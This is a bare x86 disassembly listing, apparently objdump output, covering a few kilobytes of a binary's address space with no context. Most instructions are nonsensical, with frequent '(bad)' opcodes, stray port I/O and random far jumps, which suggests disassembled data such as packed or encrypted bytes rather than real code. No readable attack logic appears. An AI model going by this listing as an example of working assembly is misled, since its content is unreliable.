  421334:	in     eax,dx
  421335:	mov    BYTE PTR [edx-0x59c5f8a9],bl
  42133b:	mov    dh,0xcf
  42133d:	dec    eax
  42133e:	pop    esi
  42133f:	push   ss
  421340:	and    DWORD PTR [esi],0x49
  421343:	addr16 push esi
  421345:	mov    al,ds:0x5ee9d1b3
  42134a:	dec    esi
  42134b:	inc    ebx
  42134c:	ficom  WORD PTR [edi-0x4e7deb79]
  421352:	add    BYTE PTR [edx+0x1f1dc3a3],0xd1
  421359:	(bad)  
  42135a:	mov    ch,0x90
  42135c:	push   ecx
  42135d:	and    eax,0x57e1ac4b
  421362:	sub    ebx,ebp
  421364:	(bad)  
  421365:	jno    0x4213a9
  421367:	push   ecx
  421368:	ret    
  421369:	sbb    eax,0x309d882c
  42136e:	in     al,0xad
  421370:	aaa    
  421371:	stos   BYTE PTR es:[edi],al
  421372:	add    BYTE PTR ss:[ecx],0xe4
  421376:	popa   
  421377:	push   ebp
  421378:	in     eax,dx
  421379:	pop    esp
  42137a:	add    eax,0xb4a462f3
  42137f:	imul   esi,DWORD PTR [eax+0x336dfb92],0x31
  421386:	sahf   
  421387:	xchg   ecx,eax
  421388:	sti    
  421389:	add    al,0xfb
  42138b:	mov    al,0x2b
  42138d:	inc    ebp
  42138e:	jne    0x421409
  421390:	sbb    ebx,ebx
  421392:	fadd   st,st(5)
  421394:	pop    ecx
  421395:	mov    ecx,esi
  421397:	xor    esi,DWORD PTR [ecx+edx*8+0x5fcb3f51]
  42139e:	pop    edx
  42139f:	mul    DWORD PTR [esi-0x2c]
  4213a2:	and    DWORD PTR [eax+0x6d],edi
  4213a5:	inc    ecx
  4213a6:	inc    esi
  4213a7:	mov    ah,0x53
  4213a9:	es mov edi,0x1886eadf
  4213af:	mov    bl,0xb0
  4213b1:	call   0xa171:0xcac0edd9
  4213b8:	inc    edx
  4213b9:	inc    esp
  4213ba:	or     BYTE PTR [ecx],0x22
  4213bd:	mov    ebx,0xfea1c15c
  4213c2:	out    dx,al
  4213c3:	das    
  4213c4:	mov    ecx,0xc369ae9f
  4213c9:	jo     0x4213fe
  4213cb:	push   esp
  4213cc:	pop    edi
  4213cd:	rcr    bh,0x92
  4213d0:	xchg   ebp,eax
  4213d1:	shl    bl,cl
  4213d3:	push   ebx
  4213d4:	cs sbb ebx,ecx
  4213d7:	dec    ebx
  4213d8:	mov    al,ds:0x21188d61
  4213dd:	cdq    
  4213de:	jmp    0x9522:0x94b508a2
  4213e5:	xchg   esi,eax
  4213e6:	add    cl,BYTE PTR [ebx-0x4dc1a423]
  4213ec:	or     DWORD PTR [ecx+0x6d],0x94597a22
  4213f3:	sub    al,0x72
  4213f5:	jnp    0x421450
  4213f7:	or     dl,BYTE PTR [ecx-0x13962a14]
  4213fd:	adc    eax,0xe1f4d8cf
  421402:	push   0xffffffd8
  421404:	mov    ds,WORD PTR [esi]
  421406:	fidivr DWORD PTR [ebp+eax*8+0x743843be]
  42140d:	fbstp  TBYTE PTR [edx-0x6d]
  421410:	cmc    
  421411:	ins    DWORD PTR es:[edi],dx
  421412:	xlat   BYTE PTR ds:[ebx]
  421413:	jp     0x421470
  421415:	xchg   ebp,eax
  421416:	mov    cl,0x8b
  421418:	add    eax,0xd788449b
  42141d:	dec    edx
  42141e:	add    dl,BYTE PTR [eax-0x6fd7afa9]
  421424:	add    dh,BYTE PTR [ebx+0x3b]
  421427:	sub    ah,BYTE PTR [eax-0x5]
  42142a:	jge    0x42147e
  42142c:	out    0xec,al
  42142e:	pop    ebp
  42142f:	sahf   
  421430:	mov    esi,0xe7b7969a
  421435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421436:	mov    eax,ds:0x6a3515c6
  42143b:	or     ebp,DWORD PTR [edx+0x6]
  42143e:	cmp    dh,ch
  421440:	inc    esi
  421441:	push   ebx
  421442:	lea    ebx,[ebp-0x5d]
  421445:	mov    al,0xda
  421447:	sbb    eax,0xb28d451f
  42144c:	(bad)  
  42144d:	arpl   ax,cx
  42144f:	push   esp
  421450:	jge    0x4213f7
  421452:	inc    ebx
  421453:	(bad)  [ebx-0x33467734]
  421459:	jecxz  0x421463
  42145b:	cmp    eax,ebp
  42145d:	mov    cl,0xe4
  42145f:	cmp    ecx,DWORD PTR [esi+eiz*2-0x5c]
  421463:	idiv   ecx
  421465:	sub    al,0x2
  421467:	sub    ch,BYTE PTR [edx+0xe]
  42146a:	inc    esi
  42146b:	push   ebp
  42146c:	ins    BYTE PTR es:[edi],dx
  42146d:	add    al,BYTE PTR [ebp+0x68]
  421470:	mov    DWORD PTR [ecx],ebp
  421472:	push   esp
  421473:	sbb    al,BYTE PTR [ecx+0x5c965660]
  421479:	ror    DWORD PTR [eax],0x38
  42147c:	leave  
  42147d:	jg     0x4214e2
  42147f:	inc    ebp
  421480:	push   esi
  421481:	xor    BYTE PTR [edi+0x52e80671],bh
  421487:	out    0x8f,eax
  421489:	out    dx,eax
  42148a:	xchg   edx,eax
  42148b:	sub    BYTE PTR [ebx+ebx*1-0x25],ch
  42148f:	xchg   esi,eax
  421490:	adc    BYTE PTR [edx+0xf28f4a],bh
	...
  421512:	add    BYTE PTR [eax],al
  421514:	pushf  
  421515:	sbb    al,bl
  421517:	push   esi
  421518:	(bad)  
  42151a:	sahf   
  42151b:	fidivr DWORD PTR [esi-0x64]
  42151e:	add    al,ah
  421520:	(bad)  
  421522:	retf   
  421523:	outs   dx,BYTE PTR ds:[esi]
  421524:	sub    eax,0x690001ac
  421529:	pop    es
  42152a:	add    BYTE PTR [eax],al
  42152c:	xchg   edx,eax
  42152d:	call   0xb9d3:0xe153367a
  421534:	push   edi
  421535:	push   edx
  421536:	xchg   esi,eax
  421537:	add    edi,DWORD PTR [ebx-0x44]
  42153a:	inc    ecx
  42153b:	jle    0x4215a1
  42153d:	lds    esi,FWORD PTR [eax+0x78e65db4]
  421543:	jno    0x42152e
  421545:	xor    al,BYTE PTR [eax-0x3dceeb8b]
  42154b:	push   esi
  42154c:	inc    eax
  42154d:	inc    edi
  42154e:	(bad)  
  42154f:	bound  eax,QWORD PTR [edx]
  421551:	and    dh,BYTE PTR [edx-0x5]
  421554:	xor    al,0xed
  421556:	fs adc eax,edx
  421559:	xor    ch,BYTE PTR [edi-0x5b0ecc3b]
  42155f:	pop    es
  421560:	aas    
  421561:	outs   dx,DWORD PTR ds:[esi]
  421562:	xor    DWORD PTR gs:[ecx-0x7975c3c1],ebx
  421569:	dec    esi
  42156a:	add    al,0x8b
  42156c:	pop    ds
  42156d:	aam    0x51
  42156f:	mov    bl,0xe8
  421571:	inc    ebp
  421572:	dec    eax
  421573:	xor    DWORD PTR [edx-0x546800ad],esp
  421579:	xchg   ebp,eax
  42157a:	jb     0x42156e
  42157c:	jge    0x4215f2
  42157e:	hlt    
  42157f:	push   esi
  421580:	in     al,dx
  421581:	mov    BYTE PTR [ebp+0x5a],bh
  421584:	int3   
  421585:	push   ds
  421586:	mov    dh,0x89
  421588:	pop    esi
  421589:	ins    BYTE PTR es:[edi],dx
  42158a:	xchg   edi,eax
  42158b:	bound  edi,QWORD PTR [ebp-0x12]
  42158e:	enter  0x3c3c,0x21
  421592:	push   ecx
  421593:	mov    esp,0xe7b53eff
  421598:	mov    bl,0xe3
  42159a:	aaa    
  42159b:	shl    BYTE PTR [esp+eax*8+0x28],cl
  42159f:	add    al,0xe5
  4215a1:	and    dl,BYTE PTR [ecx+edx*1+0x61077817]
  4215a8:	cmp    eax,0x8763ae55
  4215ad:	inc    ebp
  4215ae:	push   es
  4215af:	dec    esi
  4215b0:	jae    0x4215fd
  4215b2:	push   0x70a6f108
  4215b7:	dec    ecx
  4215b8:	add    eax,0x130905ae
  4215bd:	dec    esi
  4215be:	mov    DWORD PTR [ebx],eax
  4215c0:	lea    ebp,[edx]
  4215c2:	add    eax,0x42273cdc
  4215c7:	cwde   
  4215c8:	ds xchg ebx,ebx
  4215cb:	shl    DWORD PTR [edx-0x6d07b6ef],cl
  4215d1:	inc    eax
  4215d2:	pop    ds
  4215d3:	sbb    BYTE PTR [ecx],dh
  4215d5:	adc    DWORD PTR [eax],ecx
  4215d7:	mov    esi,0x29bec502
  4215dc:	sub    edi,DWORD PTR [esi+0x545ae4de]
  4215e2:	out    dx,eax
  4215e3:	cdq    
  4215e4:	add    al,0x5c
  4215e6:	jns    0x421647
  4215e8:	push   es
  4215e9:	out    0x9c,al
  4215eb:	(bad)  
  4215ec:	scas   eax,DWORD PTR es:[edi]
  4215ed:	daa    
  4215ee:	jle    0x421669
  4215f0:	cmp    edi,DWORD PTR [ebx]
  4215f2:	test   al,0xaf
  4215f4:	xor    dh,BYTE PTR [ecx+0x72]
  4215f7:	cmp    al,0xb5
  4215f9:	outs   dx,BYTE PTR ds:[esi]
  4215fa:	push   es
  4215fb:	ins    DWORD PTR es:[edi],dx
  4215fc:	mov    edx,esp
  4215fe:	outs   dx,BYTE PTR ds:[esi]
  4215ff:	jmp    FWORD PTR [ecx-0x1]
  421602:	bound  ecx,QWORD PTR [ecx-0x36]
  421605:	push   ebp
  421606:	xchg   esp,eax
  421607:	stc    
  421608:	aaa    
  421609:	shld   DWORD PTR [edi],esi,0xf9
  42160d:	mov    eax,ds:0x3dda94e8
  421612:	test   eax,0x3f6c2fd5
  421617:	test   al,0x90
  421619:	pop    es
  42161a:	add    DWORD PTR [eax],esi
  42161c:	aaa    
  42161d:	pop    esp
  42161e:	jne    0x42166b
  421620:	aas    
  421621:	jo     0x4215b9
  421623:	push   cs
  421624:	or     esp,DWORD PTR [esp+ecx*8+0x7fb62149]
  42162b:	(bad)  
  42162c:	and    eax,0xe90bf100
  421631:	or     DWORD PTR [ecx],edi
  421633:	daa    
  421634:	int3   
  421635:	shl    BYTE PTR gs:[esi-0x69],cl
  421639:	mov    bl,cl
  42163b:	shr    DWORD PTR [esp+eax*1],0x13
  42163f:	inc    ebp
  421640:	inc    edi
  421641:	fisubr DWORD PTR [eax-0xadace12]
  421647:	(bad)  [eax]
  421649:	adc    eax,0x53d0304e
  42164e:	rol    DWORD PTR ss:[edx+0x3e],cl
  421652:	repz fcmovnu st,st(3)
  421655:	popa   
  421656:	loop   0x421611
  421658:	mov    cl,0xe8
  42165a:	sbb    eax,0x867ee454
  42165f:	cwde   
  421660:	je     0x421678
  421662:	fst    QWORD PTR [ebx]
  421664:	mov    ebx,0x2789293d
  421669:	fdiv   DWORD PTR es:[ebp+0x40]
  42166d:	sub    eax,0xe78c4a48
  421672:	dec    sp
  421674:	xchg   DWORD PTR [ebx],esi
  421676:	fsub   QWORD PTR [edx-0x47e75e99]
  42167c:	ret    0x5cab
  42167f:	loop   0x42166a
  421681:	push   cs
  421682:	lea    eax,[eax]
  421684:	imul   ecx,DWORD PTR [eax+0x5],0x3f
  421688:	xor    DWORD PTR [esi],ebp
  42168a:	dec    eax
  42168b:	(bad)  
  42168c:	iret   
  42168d:	pop    es
  42168e:	rol    BYTE PTR [edx],1
  421690:	test   BYTE PTR [ebp+0x2aecd05b],al
  421696:	ror    BYTE PTR [edx],1
  421698:	and    BYTE PTR [edi],dl
  42169a:	jmp    0x59e4:0xd231cf03
  4216a1:	fdivrp st(4),st
  4216a3:	cmp    DWORD PTR [eax-0x4a1a69d3],ecx
  4216a9:	adc    ebp,DWORD PTR [eax]
  4216ab:	jge    0x42167e
  4216ad:	test   al,0x86
  4216af:	pusha  
  4216b0:	imul   ecx,DWORD PTR es:[edx+0x22],0x28
  4216b5:	dec    edi
  4216b6:	test   al,0x78
  4216b8:	outs   dx,DWORD PTR ds:[esi]
  4216b9:	clc    
  4216ba:	aas    
  4216bb:	add    DWORD PTR ds:0xedf81d53,edi
  4216c1:	shl    DWORD PTR [eax-0x5a],1
  4216c4:	arpl   ax,sp
  4216c6:	and    dl,BYTE PTR ds:0x8953576e
  4216cc:	push   0xb05eee50
  4216d1:	out    dx,al
  4216d2:	push   esp
  4216d3:	pop    ebp
  4216d4:	sub    al,0x3c
  4216d6:	in     eax,0xfb
  4216d8:	jecxz  0x421721
  4216da:	data16 in al,0xda
  4216dd:	and    ebx,DWORD PTR [esi]
  4216df:	rol    DWORD PTR [esi+0x7cb2a718],cl
  4216e5:	or     al,0x80
  4216e7:	inc    esi
  4216e8:	les    edx,FWORD PTR [edx]
  4216ea:	mov    esp,esi
  4216ec:	in     al,dx
  4216ed:	jecxz  0x421715
  4216ef:	push   ebp
  4216f0:	jae    0x4216be
  4216f2:	repz xchg edx,eax
  4216f4:	push   ss
  4216f5:	lods   al,BYTE PTR ds:[esi]
  4216f6:	pop    edi
  4216f7:	xor    al,0x87
  4216f9:	aaa    
  4216fa:	ins    BYTE PTR es:[edi],dx
  4216fb:	lods   eax,DWORD PTR ds:[esi]
  4216fc:	lahf   
  4216fd:	rsqrtps xmm5,xmm5
  421700:	push   ecx
  421701:	adc    ebx,ebx
  421703:	(bad)  
  421704:	and    cl,ah
  421706:	xchg   ebp,eax
  421707:	aad    0x39
  421709:	push   ds
  42170a:	clc    
  42170b:	and    eax,0xeb1e03ec
  421710:	and    ebp,ecx
  421712:	ja     0x421755
  421714:	outs   dx,DWORD PTR ds:[esi]
  421715:	ret    0x848a
  421718:	xchg   edi,eax
  421719:	cs jb  0x42170f
  42171c:	fiadd  WORD PTR [edi+0x2a]
  42171f:	pushf  
  421720:	mov    bh,0x97
  421722:	les    ecx,FWORD PTR [edx+0x2d]
  421725:	add    eax,0x5835f9a9
  42172a:	fwait
  42172b:	loope  0x4216af
  42172d:	pop    esi
  42172e:	jae    0x421741
  421730:	cld    
  421731:	or     eax,0xc4bc1391
  421736:	out    dx,eax
  421737:	add    al,BYTE PTR [esi+edi*8-0x19510174]
  42173e:	int3   
  42173f:	mov    DWORD PTR [ebx-0x45],edi
  421742:	mov    bh,0xcf
  421744:	mov    edx,0xba8dc367
  421749:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42174a:	test   BYTE PTR [ecx-0x391144e9],dl
  421750:	or     eax,edx
  421752:	cli    
  421753:	dec    ebx
  421754:	push   edx
  421755:	inc    edx
  421756:	adc    cl,BYTE PTR [ecx+0x0]
  421759:	push   es
  42175a:	sub    eax,0x5223a227
  42175f:	icebp  
  421760:	dec    eax
  421761:	or     dl,BYTE PTR [edx-0xaecdb69]
  421767:	inc    edi
  421768:	mov    edx,0xc7ac2d65
  42176d:	jl     0x4217de
  42176f:	mov    dl,0x72
  421771:	or     BYTE PTR [edx-0x4257ea76],bl
  421777:	nop
  421778:	outs   dx,BYTE PTR ds:[esi]
  421779:	aaa    
  42177a:	jae    0x421777
  42177c:	fbld   TBYTE PTR [ebp+0x6c73e05b]
  421782:	cmp    esi,ebp
  421784:	fnstsw WORD PTR [eax]
  421786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421787:	push   ebp
  421788:	(bad)  
  421789:	rcr    DWORD PTR [edi],1
  42178b:	sti    
  42178c:	ret    0xe23a
  42178f:	test   al,0x89
  421791:	mov    cl,0x4b
  421793:	push   ds
  421794:	push   esp
  421795:	xor    al,0x1a
  421797:	and    eax,DWORD PTR [ebx-0x15e1615e]
  42179d:	(bad)  
  42179e:	pop    esi
  42179f:	push   ds
  4217a0:	cdq    
  4217a1:	ins    DWORD PTR es:[edi],dx
  4217a2:	push   ss
  4217a3:	pandn  mm5,QWORD PTR [ecx]
  4217a6:	jge    0x4217ba
  4217a8:	mov    bh,0xa5
  4217aa:	ror    BYTE PTR [ecx-0x51b95bde],0x21
  4217b1:	push   ecx
  4217b2:	fwait
  4217b3:	sub    BYTE PTR [esi+ebp*4],bl
  4217b6:	inc    BYTE PTR [eax+ebx*1+0x56]
  4217ba:	pop    es
  4217bb:	dec    ecx
  4217bc:	and    edx,DWORD PTR [ebp-0x16fd476c]
  4217c2:	lea    eax,[eax-0x20caa59c]
  4217c8:	add    ah,BYTE PTR [edx+0x26462163]
  4217ce:	retf   0xf52e
  4217d1:	pop    ebp
  4217d2:	xor    eax,0xe99a73ed
  4217d7:	xlat   BYTE PTR ds:[ebx]
  4217d8:	mov    ebp,0xba586f43
  4217dd:	mov    ebx,0xd88be059
  4217e2:	pusha  
  4217e3:	imul   ecx,edx,0x65
  4217e6:	retf   
  4217e7:	mov    edi,0xc7afd09f
  4217ec:	dec    cl
  4217ee:	adc    edi,DWORD PTR [ecx-0x3f1bd9e4]
  4217f4:	dec    esp
  4217f5:	jnp    0x421856
  4217f7:	push   ss
  4217f8:	pop    edi
  4217f9:	or     BYTE PTR [edx-0x2da6c7ce],dl
  4217ff:	cmp    BYTE PTR ds:0xae4aaa33,0x17
  421806:	scas   eax,DWORD PTR es:[edi]
  421807:	mov    al,ds:0xd084af01
  42180c:	aad    0x65
  42180e:	fs leave 
  421810:	or     al,BYTE PTR [ecx]
  421812:	dec    esp
  421813:	out    0x9b,eax
  421815:	mov    ds,WORD PTR [edi+0x70]
  421818:	sub    ecx,esi
  42181a:	mov    ah,BYTE PTR [ebp+0x10297a0]
  421820:	add    BYTE PTR [ebx-0x21],cl
  421823:	les    edx,FWORD PTR [edx+ebx*8-0x6]
  421827:	add    al,0xa1
  421829:	imul   DWORD PTR ds:0x27b9ab02
  42182f:	xchg   esp,eax
  421830:	push   eax
  421831:	push   ecx
  421832:	and    esp,DWORD PTR [ebx-0x2a]
  421835:	xlat   BYTE PTR ds:[ebx]
  421836:	popa   
  421837:	aam    0x7
  421839:	xor    eax,0xae802a16
  42183e:	retf   0x2483
  421841:	cmp    DWORD PTR [edi-0x3],0xad2191b2
  421848:	pop    ebx
  421849:	cld    
  42184a:	mov    WORD PTR [edx+0x3a6f98ec],cs
  421850:	nop
  421851:	push   esp
  421852:	std    
  421853:	fwait
  421854:	imul   edi,edi,0x5f
  421857:	daa    
  421858:	dec    esi
  421859:	imul   eax,DWORD PTR ds:0xaaac7f83,0x7d
  421860:	inc    edx
  421861:	cmp    esp,DWORD PTR [ebx-0x19]
  421864:	push   esp
  421865:	mov    ah,0x27
  421867:	out    dx,eax
  421868:	mov    ds:0xd19cdb01,al
  42186d:	int    0xd4
  42186f:	xor    eax,0x552d36f2
  421874:	push   esp
  421875:	lods   eax,DWORD PTR ds:[esi]
  421876:	jnp    0x42180e
  421878:	bound  edx,QWORD PTR [ecx]
  42187a:	mov    dl,0x2a
  42187c:	mov    ebx,0x1ea939c5
  421881:	pop    esi
  421882:	frstor [esi-0x6b]
  421885:	lods   eax,DWORD PTR ds:[esi]
  421886:	cli    
  421887:	pop    edx
  421888:	or     DWORD PTR [eax+eax*8-0x51],esi
  42188c:	jge    0x42189a
  42188e:	adc    eax,0x117ad9a2
  421893:	dec    eax
  421894:	push   ebp
  421895:	mov    edx,DWORD PTR [ebp-0x38]
  421898:	lods   eax,DWORD PTR ds:[esi]
  421899:	mov    al,ds:0xb99d9e37
  42189e:	or     DWORD PTR [esi],ebp
  4218a0:	mov    ah,0x89
  4218a2:	cmc    
  4218a3:	and    BYTE PTR [eax+ecx*1],cl
  4218a6:	lock mov ch,0xe4
  4218a9:	xchg   esp,eax
  4218aa:	sbb    eax,0x21b7e977
  4218af:	jno    0x4218bd
  4218b1:	loop   0x421853
  4218b3:	lea    ebp,[esi]
  4218b5:	pop    esi
  4218b6:	add    bl,bh
  4218b8:	pop    ebp
  4218b9:	jae    0x42186d
  4218bb:	fcomip st,st(7)
  4218bd:	sahf   
  4218be:	data16 aam 0x8c
  4218c1:	add    cl,BYTE PTR [edi+0x45]
  4218c4:	inc    esp
  4218c5:	push   cs
  4218c6:	mov    ds:0xe7110c25,al
  4218cb:	das    
  4218cc:	pop    esi
  4218cd:	xchg   esi,eax
  4218ce:	js     0x42187f
  4218d0:	ins    BYTE PTR es:[edi],dx
  4218d1:	and    eax,0x217ffa82
  4218d6:	ret    
  4218d7:	mov    WORD PTR cs:[eax+0x561a103],ds
  4218de:	push   edi
  4218df:	xchg   ebx,eax
  4218e0:	pushf  
  4218e1:	ret    
  4218e2:	jp     0x42191f
  4218e4:	clc    
  4218e5:	imul   esp,DWORD PTR [ebp-0x3c],0xffffffd3
  4218e9:	xchg   ecx,eax
  4218ea:	mov    dh,0x4c
  4218ec:	inc    edi
  4218ed:	call   0x2dc1233f
  4218f2:	fsubr  DWORD PTR [ebx-0x147acc4a]
  4218f8:	xlat   BYTE PTR ds:[ebx]
  4218f9:	mov    bl,0x65
  4218fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218fc:	pop    edx
  4218fd:	addr16 loop 0x4218f0
  421900:	jbe    0x421956
  421902:	(bad)  
  421904:	jge    0x421913
  421906:	sub    al,0xaf
  421908:	dec    ebp
  421909:	addr16 jns 0x4218d0
  42190c:	repnz nop
  42190e:	bound  ebp,QWORD PTR [ecx+ebp*4-0x6019446c]
  421915:	mov    al,0x7d
  421917:	mov    DWORD PTR [edx+0x19],edi
  42191a:	(bad)  
  42191c:	test   BYTE PTR [ebx],dl
  42191e:	dec    ebx
  42191f:	stc    
  421920:	dec    edi
  421921:	sti    
  421922:	retf   
  421923:	jl     0x4218d4
  421925:	jge    0x421928
  421927:	and    esp,DWORD PTR [eax]
  421929:	mov    dh,0xdc
  42192b:	repnz xchg ecx,eax
  42192d:	inc    BYTE PTR [ecx]
  42192f:	shr    DWORD PTR [ebx+0x3f7fe11d],cl
  421935:	ds jmp 0x4218b8
  421938:	cmp    edx,ecx
  42193a:	call   FWORD PTR [eax+0x7d]
  42193d:	mov    bh,0x63
  421940:	popa   
  421941:	ja     0x4219b7
  421943:	jl     0x421938
  421945:	mov    al,0x12
  421947:	push   edx
  421948:	out    dx,al
  421949:	das    
  42194a:	loop   0x421954
  42194c:	sbb    eax,0x67edbeac
  421951:	cmp    bl,0x6f
  421954:	iret   
  421955:	mov    ebx,0x9780db7f
  42195a:	fdivr  QWORD PTR [ebx]
  42195c:	dec    ecx
  42195d:	(bad)
  421961:	sub    DWORD PTR [edx-0xb],ebx
  421964:	retf   0x6f81
  421967:	nop
  421968:	fldenv ds:0xb765da2d
  42196e:	fild   WORD PTR [ecx+edx*8]
  421971:	mov    ch,0x69
  421973:	dec    edx
  421974:	cmp    BYTE PTR [eax-0x33],0x80
  421978:	adc    DWORD PTR [esi-0x5b924f3e],eax
  42197e:	aam    0xa8
  421980:	pop    eax
  421981:	xchg   DWORD PTR [edi],esp
  421983:	retf   0x437c
  421986:	inc    esi
  421987:	or     al,0x74
  421989:	imul   esp,DWORD PTR [esi-0x73],0x19
  42198d:	ret    0x6822
  421990:	lock cmc 
  421992:	cli    
  421993:	(bad)
  421996:	inc    ecx
  421997:	mov    al,0xd1
  421999:	int    0x9c
  42199b:	sub    cl,dl
  42199d:	xchg   edx,eax
  42199e:	mov    al,ds:0x7948cc82
  4219a3:	cmc    
  4219a4:	xchg   edx,edi
  4219a6:	jno    0x4219b3
  4219a8:	cmp    DWORD PTR [ebx+0x4f6557c4],ebx
  4219ae:	imul   bh
  4219b0:	scas   al,BYTE PTR es:[edi]
  4219b1:	in     eax,dx
  4219b2:	in     al,dx
  4219b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219b4:	cmp    BYTE PTR [esi+ebp*4],bh
  4219b7:	into   
  4219b8:	lods   al,BYTE PTR ds:[esi]
  4219b9:	(bad)  
  4219ba:	pop    edi
  4219bb:	mov    ebp,0x17e46ded
  4219c0:	jecxz  0x4219bd
  4219c2:	js     0x4219f7
  4219c4:	sub    ah,BYTE PTR [eax+0x53ee7a44]
  4219ca:	clc    
  4219cb:	daa    
  4219cc:	mov    eax,ecx
  4219ce:	adc    ebp,DWORD PTR [edi]
  4219d0:	mov    ah,0x12
  4219d2:	stos   DWORD PTR es:[edi],eax
  4219d3:	pop    ss
  4219d4:	mov    ds,WORD PTR [ebp+esi*2-0x3a77fbc1]
  4219db:	jmp    0x42199a
  4219dd:	xor    DWORD PTR [esi],ecx
  4219df:	dec    esp
  4219e0:	sub    BYTE PTR [edi],0xe4
  4219e3:	jns    0x421a61
  4219e5:	dec    ecx
  4219e6:	pop    edi
  4219e7:	js     0x421a09
  4219e9:	mul    DWORD PTR [edi-0x3e]
  4219ec:	lahf   
  4219ed:	cmp    edx,DWORD PTR [edi-0x3c]
  4219f0:	jmp    0xf8ea:0xbf249053
  4219f7:	mov    cl,BYTE PTR [ecx-0x10]
  4219fa:	aas    
  4219fb:	xor    esp,DWORD PTR [ebx-0x35]
  4219fe:	daa    
  4219ff:	es mov esi,0x7b8460fd
  421a05:	inc    edx
  421a06:	push   ss
  421a07:	add    ecx,DWORD PTR [esi+0x1679082e]
  421a0d:	or     ah,BYTE PTR [ebp-0x69]
  421a10:	cwde   
  421a11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a12:	mov    dl,0x10
  421a14:	sbb    esp,0xffffffa2
  421a17:	in     al,dx
  421a18:	cld    
  421a19:	pop    eax
  421a1a:	cld    
  421a1b:	test   DWORD PTR [eax],ebp
  421a1d:	xor    eax,0x7dbfb953
  421a22:	inc    ebp
  421a23:	cmp    BYTE PTR [edx],dh
  421a25:	pop    esi
  421a26:	scas   al,BYTE PTR es:[edi]
  421a27:	inc    ebx
  421a28:	adc    ch,BYTE PTR [ebp+eax*4-0x7d]
  421a2c:	das    
  421a2d:	add    eax,0xe080babe
  421a32:	not    ch
  421a34:	scas   eax,DWORD PTR es:[edi]
  421a35:	add    BYTE PTR [edi],ah
  421a37:	int3   
  421a38:	push   eax
  421a39:	and    cl,al
  421a3b:	pushf  
  421a3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a3d:	fcmovnb st,st(7)
  421a3f:	arpl   WORD PTR [edx-0x1cc17150],bp
  421a45:	cdq    
  421a46:	test   BYTE PTR [esi-0x5f],ah
  421a49:	(bad)  
  421a4b:	sub    al,0x7e
  421a4d:	je     0x4219db
  421a4f:	xor    BYTE PTR [ecx-0x53],0x0
  421a53:	jne    0x421a18
  421a55:	jno    0x4219db
  421a57:	rcr    bl,cl
  421a59:	daa    
  421a5a:	sub    eax,0xf6d24f64
  421a5f:	arpl   di,si
  421a61:	lock dec edi
  421a63:	sub    eax,0xc089ad70
  421a68:	out    0xe5,al
  421a6a:	aas    
  421a6b:	dec    ebp
  421a6c:	icebp  
  421a6d:	test   al,0xd2
  421a6f:	ret    0xd3c
  421a72:	jp     0x421ac2
  421a74:	daa    
  421a75:	xchg   ecx,eax
  421a76:	sbb    BYTE PTR [ecx+0xb651543],bl
  421a7c:	out    dx,eax
  421a7d:	mov    edi,0x2f68946e
  421a82:	ds cwde 
  421a84:	(bad)  
  421a85:	sbb    eax,0x270575e1
  421a8a:	mov    ecx,0xedb7ed44
  421a8f:	pushf  
  421a90:	clc    
  421a91:	mov    dh,dh
  421a93:	sbb    BYTE PTR [eax+0x2075bb37],ch
  421a99:	ins    BYTE PTR es:[edi],dx
  421a9a:	adc    DWORD PTR [eax],edx
  421a9c:	jg     0x421ae9
  421a9e:	pop    es
  421a9f:	pop    ds
  421aa0:	and    al,0x42
  421aa2:	mov    cl,0x56
  421aa4:	jbe    0x421a7f
  421aa6:	popf   
  421aa7:	and    al,0x20
  421aa9:	jge    0x421b26
  421aab:	jb     0x421a3a
  421aad:	add    al,BYTE PTR [esi-0x79e19d66]
  421ab3:	or     eax,0x2a20523c
  421ab8:	sub    eax,0xbeb5ef89
  421abd:	out    dx,eax
  421abe:	aam    0xb8
  421ac0:	pop    ecx
  421ac1:	push   0xa305caba
  421ac6:	and    esi,DWORD PTR [esi+0xc]
  421ac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421aca:	jmp    0x5a83:0x56b02aa1
  421ad1:	mov    ch,bh
  421ad3:	inc    ebp
  421ad4:	adc    BYTE PTR [esi],0x55
  421ad7:	test   BYTE PTR [eax+ebx*1],cl
  421ada:	leave  
  421adb:	sub    ebx,esi
  421add:	mov    dl,0xc6
  421adf:	shr    BYTE PTR [eax+ecx*2-0x3f202a5],0xf0
  421ae7:	mov    bh,0x68
  421ae9:	push   esp
  421aea:	add    dl,BYTE PTR ds:0x2adf13fe
  421af0:	mov    ds:0x7dd6e7b5,eax
  421af5:	sub    ebx,edi
  421af7:	(bad)  
  421af8:	data16 mov bl,BYTE PTR [eax+eiz*2-0x4996cb16]
  421b00:	sub    al,BYTE PTR [eax-0x5a]
  421b03:	loopne 0x421a90
  421b05:	and    bh,bl
  421b07:	adc    dl,BYTE PTR [esi-0x59]
  421b0a:	rol    esp,0x79
  421b0d:	dec    ebp
  421b0e:	sbb    BYTE PTR [ebp-0x50],ah
  421b11:	in     eax,0xa3
  421b13:	or     al,0xd1
  421b15:	mov    dh,0x4c
  421b17:	clc    
  421b18:	iret   
  421b19:	mov    fs,WORD PTR [ebx]
  421b1b:	sub    al,0xfa
  421b1d:	inc    BYTE PTR [eax+0x549efec2]
  421b23:	cmp    cl,BYTE PTR [eax-0x42]
  421b26:	mov    edi,0xd4389af7
  421b2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b2c:	pmaxsw mm5,QWORD PTR [eax]
  421b2f:	sub    dl,cl
  421b31:	push   esp
  421b32:	xor    BYTE PTR [edi+0x3a407f6f],0x70
  421b39:	xor    eax,0x4990e049
  421b3e:	loopne 0x421b94
  421b40:	dec    eax
  421b41:	call   FWORD PTR [edi-0xe]
  421b44:	push   ecx
  421b45:	int    0x9
  421b47:	out    0x9b,al
  421b49:	push   0xffffffb6
  421b4b:	xor    DWORD PTR [edi+0x5f556e55],edi
  421b51:	push   cs
  421b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b53:	push   edi
  421b54:	mov    ch,0x1e
  421b56:	fmul   st,st(4)
  421b58:	mov    WORD PTR [ebp+0x6f],cs
  421b5b:	pop    ss
  421b5c:	pop    esi
